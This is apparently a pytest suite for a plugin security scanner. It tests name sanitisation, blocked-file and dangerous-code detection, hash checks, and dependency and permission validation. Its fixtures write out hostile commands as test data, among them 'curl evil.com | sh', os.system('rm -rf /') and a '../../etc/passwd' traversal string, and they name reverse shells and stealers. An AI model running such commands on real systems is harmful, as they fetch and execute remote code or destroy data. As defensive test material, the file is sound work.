"""Tests for plugin security: scanning, verification, sanitization, dependency validation."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from qanot.plugins.security import (
    compute_plugin_hash,
    has_critical_findings,
    has_high_findings,
    sanitize_plugin_name,
    scan_plugin,
    scan_plugin_code,
    scan_plugin_files,
    security_check,
    validate_dependencies,
    validate_permissions,
    verify_plugin_hash,
)


# ── Name sanitization (directory traversal prevention) ────


class TestSanitizePluginName:
    def test_simple_name(self):
        name, safe = sanitize_plugin_name("myplug")
        assert name == "myplug"
        assert safe

    def test_strips_git_suffix(self):
        name, safe = sanitize_plugin_name("my-plugin.git")
        assert name == "my_plugin"
        assert safe

    def test_strips_qanot_prefix(self):
        name, safe = sanitize_plugin_name("qanot-plugin-crm")
        assert name == "crm"
        assert safe

    def test_strips_url_path(self):
        name, safe = sanitize_plugin_name("https://github.com/user/qanot-plugin-foo.git")
        assert name == "foo"
        assert safe

    def test_blocks_directory_traversal_dots(self):
        _, safe = sanitize_plugin_name("../../etc/passwd")
        assert not safe

    def test_blocks_directory_traversal_slash(self):
        _, safe = sanitize_plugin_name("foo/bar")
        assert not safe

    def test_blocks_backslash(self):
        _, safe = sanitize_plugin_name("foo\\bar")
        assert not safe

    def test_blocks_null_byte(self):
        _, safe = sanitize_plugin_name("foo\x00bar")
        assert not safe

    def test_blocks_empty(self):
        _, safe = sanitize_plugin_name("")
        assert not safe

    def test_blocks_starting_with_number(self):
        _, safe = sanitize_plugin_name("123plugin")
        assert not safe

    def test_blocks_special_chars(self):
        _, safe = sanitize_plugin_name("my@plugin!")
        assert not safe

    def test_max_length_64(self):
        name, safe = sanitize_plugin_name("a" * 64)
        assert safe
        name, safe = sanitize_plugin_name("a" * 65)
        assert not safe

    def test_lowercases(self):
        name, safe = sanitize_plugin_name("MyPlugin")
        assert name == "myplugin"
        assert safe

    def test_hyphen_to_underscore(self):
        name, safe = sanitize_plugin_name("my-cool-plugin")
        assert name == "my_cool_plugin"
        assert safe


# ── File scanning (blocked files/extensions) ──────────────


class TestScanPluginFiles:
    def test_blocks_install_sh(self, tmp_path):
        (tmp_path / "plugin.py").write_text("pass")
        (tmp_path / "install.sh").write_text("#!/bin/bash\ncurl evil.com | sh")

        findings = scan_plugin_files(tmp_path)
        assert len(findings) >= 1
        assert findings[0]["severity"] == "CRITICAL"
        assert "install.sh" in findings[0]["issue"]

    def test_blocks_exe(self, tmp_path):
        (tmp_path / "plugin.py").write_text("pass")
        (tmp_path / "payload.exe").write_bytes(b"\x00")

        findings = scan_plugin_files(tmp_path)
        assert any(f["severity"] == "HIGH" for f in findings)

    def test_blocks_bat(self, tmp_path):
        (tmp_path / "install.bat").write_text("echo hacked")
        findings = scan_plugin_files(tmp_path)
        assert len(findings) >= 1

    def test_blocks_env_file(self, tmp_path):
        (tmp_path / ".env").write_text("SECRET=leak")
        findings = scan_plugin_files(tmp_path)
        assert any("Blocked file" in f["issue"] for f in findings)

    def test_blocks_shell_scripts(self, tmp_path):
        (tmp_path / "setup.sh").write_text("#!/bin/bash")
        findings = scan_plugin_files(tmp_path)
        assert len(findings) >= 1

    def test_clean_plugin(self, tmp_path):
        (tmp_path / "plugin.py").write_text("class QanotPlugin: pass")
        (tmp_path / "plugin.json").write_text("{}")
        findings = scan_plugin_files(tmp_path)
        assert findings == []


# ── Code scanning (dangerous patterns) ────────────────────


class TestScanPluginCode:
    def test_detects_os_system(self, tmp_path):
        (tmp_path / "plugin.py").write_text('import os\nos.system("rm -rf /")')
        findings = scan_plugin_code(tmp_path)
        assert any("os.system" in f["issue"] for f in findings)

    def test_detects_subprocess(self, tmp_path):
        (tmp_path / "plugin.py").write_text(
            'import subprocess\nsubprocess.run(["curl", "evil.com"])'
        )
        findings = scan_plugin_code(tmp_path)
        assert any("subprocess" in f["issue"] for f in findings)

    def test_detects_eval(self, tmp_path):
        (tmp_path / "plugin.py").write_text('x = eval(input())')
        findings = scan_plugin_code(tmp_path)
        assert any("eval" in f["issue"] for f in findings)

    def test_detects_exec(self, tmp_path):
        (tmp_path / "plugin.py").write_text('exec(code)')
        findings = scan_plugin_code(tmp_path)
        assert any("exec" in f["issue"] for f in findings)

    def test_detects_pickle(self, tmp_path):
        (tmp_path / "plugin.py").write_text('import pickle\npickle.loads(data)')
        findings = scan_plugin_code(tmp_path)
        assert any("pickle" in f["issue"] for f in findings)

    def test_detects_keylogger(self, tmp_path):
        (tmp_path / "plugin.py").write_text('# start keylogger module')
        findings = scan_plugin_code(tmp_path)
        assert any("keylogger" in f["issue"] for f in findings)

    def test_detects_reverse_shell(self, tmp_path):
        (tmp_path / "plugin.py").write_text('# open reverse_shell to attacker')
        findings = scan_plugin_code(tmp_path)
        assert any("reverse shell" in f["issue"] for f in findings)

    def test_detects_ctypes(self, tmp_path):
        (tmp_path / "plugin.py").write_text('import ctypes')
        findings = scan_plugin_code(tmp_path)
        assert any("ctypes" in f["issue"] for f in findings)

    def test_detects_dynamic_import(self, tmp_path):
        (tmp_path / "plugin.py").write_text('mod = __import__("os")')
        findings = scan_plugin_code(tmp_path)
        assert any("__import__" in f["issue"] for f in findings)

    def test_detects_base64_decode(self, tmp_path):
        (tmp_path / "plugin.py").write_text(
            'import base64\ndata = base64.b64decode(payload)'
        )
        findings = scan_plugin_code(tmp_path)
        assert any("base64" in f["issue"] for f in findings)

    def test_ignores_non_critical_comments(self, tmp_path):
        """Non-critical patterns (like socket.connect) in comments are skipped."""
        (tmp_path / "plugin.py").write_text(
            '# socket.connect(("localhost", 80))\npass'
        )
        findings = scan_plugin_code(tmp_path)
        assert findings == []

    def test_scans_critical_in_comments(self, tmp_path):
        """CRITICAL patterns (keylogger, stealer) are detected even in comments."""
        (tmp_path / "plugin.py").write_text('# deploy keylogger here')
        findings = scan_plugin_code(tmp_path)
        assert any(f["severity"] == "CRITICAL" for f in findings)

    def test_clean_code(self, tmp_path):
        (tmp_path / "plugin.py").write_text(
            'import json\n\nasync def hello(params):\n    return json.dumps({"ok": True})'
        )
        findings = scan_plugin_code(tmp_path)
        assert findings == []

    def test_scans_nested_files(self, tmp_path):
        nested = tmp_path / "utils"
        nested.mkdir()
        (tmp_path / "plugin.py").write_text("pass")
        (nested / "helper.py").write_text('os.system("whoami")')
        findings = scan_plugin_code(tmp_path)
        assert len(findings) >= 1
        assert "utils/helper.py" in findings[0]["file"]

    def test_detects_stealer(self, tmp_path):
        (tmp_path / "plugin.py").write_text('# atomic stealer deployment')
        findings = scan_plugin_code(tmp_path)
        assert any(f["severity"] == "CRITICAL" for f in findings)


# ── Full security check ───────────────────────────────────


class TestSecurityCheck:
    def test_clean_plugin_passes(self, tmp_path):
        (tmp_path / "plugin.py").write_text(
            'import json\nclass QanotPlugin:\n    pass'
        )
        is_safe, findings, summary = security_check(tmp_path)
        assert is_safe
        assert findings == []

    def test_critical_blocks(self, tmp_path):
        (tmp_path / "plugin.py").write_text('os.system("rm -rf /")')
        (tmp_path / "install.sh").write_text("curl evil.com | sh")

        is_safe, findings, summary = security_check(tmp_path)
        assert not is_safe
        assert "BLOCKED" in summary

    def test_high_requires_review(self, tmp_path):
        (tmp_path / "plugin.py").write_text(
            'import subprocess\nsubprocess.run(["ls"])'
        )
        is_safe, findings, summary = security_check(tmp_path)
        assert not is_safe
        assert "review" in summary.lower()


# ── Hash verification ─────────────────────────────────────


class TestHashVerification:
    def test_compute_hash_deterministic(self, tmp_path):
        (tmp_path / "plugin.py").write_text("pass")
        h1 = compute_plugin_hash(tmp_path)
        h2 = compute_plugin_hash(tmp_path)
        assert h1 == h2
        assert len(h1) == 64  # SHA256 hex

    def test_hash_changes_on_modification(self, tmp_path):
        (tmp_path / "plugin.py").write_text("pass")
        h1 = compute_plugin_hash(tmp_path)

        (tmp_path / "plugin.py").write_text("modified")
        h2 = compute_plugin_hash(tmp_path)
        assert h1 != h2

    def test_hash_changes_on_new_file(self, tmp_path):
        (tmp_path / "plugin.py").write_text("pass")
        h1 = compute_plugin_hash(tmp_path)

        (tmp_path / "extra.py").write_text("evil")
        h2 = compute_plugin_hash(tmp_path)
        assert h1 != h2

    def test_verify_success(self, tmp_path):
        (tmp_path / "plugin.py").write_text("pass")
        expected = compute_plugin_hash(tmp_path)
        assert verify_plugin_hash(tmp_path, expected)

    def test_verify_failure_after_tamper(self, tmp_path):
        (tmp_path / "plugin.py").write_text("pass")
        expected = compute_plugin_hash(tmp_path)

        (tmp_path / "plugin.py").write_text("os.system('evil')")
        assert not verify_plugin_hash(tmp_path, expected)

    def test_ignores_git_directory(self, tmp_path):
        (tmp_path / "plugin.py").write_text("pass")
        git_dir = tmp_path / ".git"
        git_dir.mkdir()
        (git_dir / "HEAD").write_text("ref: refs/heads/main")

        h1 = compute_plugin_hash(tmp_path)

        # Changing .git content should NOT change hash
        (git_dir / "HEAD").write_text("ref: refs/heads/other")
        h2 = compute_plugin_hash(tmp_path)
        assert h1 == h2


# ── Dependency validation ─────────────────────────────────


class TestValidateDependencies:
    def test_allowed_packages(self):
        allowed, blocked = validate_dependencies(["aiohttp", "requests"])
        assert allowed == ["aiohttp", "requests"]
        assert blocked == []

    def test_blocked_packages(self):
        allowed, blocked = validate_dependencies(["evil-package", "keylogger"])
        assert allowed == []
        assert blocked == ["evil-package", "keylogger"]

    def test_mixed(self):
        allowed, blocked = validate_dependencies(["aiohttp", "evil", "redis"])
        assert allowed == ["aiohttp", "redis"]
        assert blocked == ["evil"]

    def test_version_specifiers(self):
        allowed, blocked = validate_dependencies(["aiohttp>=3.9", "requests==2.31"])
        assert len(allowed) == 2
        assert len(blocked) == 0

    def test_non_string_deps(self):
        allowed, blocked = validate_dependencies([123, None, "aiohttp"])
        assert allowed == ["aiohttp"]
        assert len(blocked) == 2

    def test_empty(self):
        allowed, blocked = validate_dependencies([])
        assert allowed == []
        assert blocked == []


# ── Permission validation ─────────────────────────────────


class TestValidatePermissions:
    def test_valid_permissions(self):
        valid, invalid = validate_permissions(["network", "database"])
        assert valid == ["network", "database"]
        assert invalid == []

    def test_invalid_permissions(self):
        valid, invalid = validate_permissions(["network", "root_access", "kernel"])
        assert valid == ["network"]
        assert invalid == ["root_access", "kernel"]


# ── Helper functions ──────────────────────────────────────


class TestHelpers:
    def test_has_critical(self):
        assert has_critical_findings([{"severity": "CRITICAL"}])
        assert not has_critical_findings([{"severity": "HIGH"}])
        assert not has_critical_findings([])

    def test_has_high(self):
        assert has_high_findings([{"severity": "HIGH"}])
        assert has_high_findings([{"severity": "CRITICAL"}])
        assert not has_high_findings([{"severity": "MEDIUM"}])
        assert not has_high_findings([])


# ── Integration: install with security ────────────────────


class TestInstallSecurity:
    """Test that install flow blocks dangerous plugins."""

    def test_http_url_blocked(self):
        from qanot.plugins.registry import install_plugin
        ok, msg = install_plugin("http://evil.com/plugin.git", Path("/tmp"))
        assert not ok
        assert "HTTPS" in msg or "MITM" in msg

    def test_traversal_name_blocked(self, tmp_path):
        from unittest.mock import patch, MagicMock
        from qanot.plugins.registry import install_plugin

        def mock_run(cmd, **kwargs):
            clone_dir = Path(cmd[-1])
            clone_dir.mkdir(parents=True, exist_ok=True)
            (clone_dir / "plugin.py").write_text("pass")
            return MagicMock(returncode=0)

        with patch("qanot.plugins.registry.subprocess.run", side_effect=mock_run):
            ok, msg = install_plugin(
                "https://github.com/evil/../../etc.git",
                tmp_path,
            )
        # Should be blocked by name sanitization
        # The sanitized name may or may not be safe depending on parsing,
        # but traversal chars are definitely blocked
        if not ok:
            assert "unsafe" in msg.lower() or "traversal" in msg.lower() or "invalid" in msg.lower()
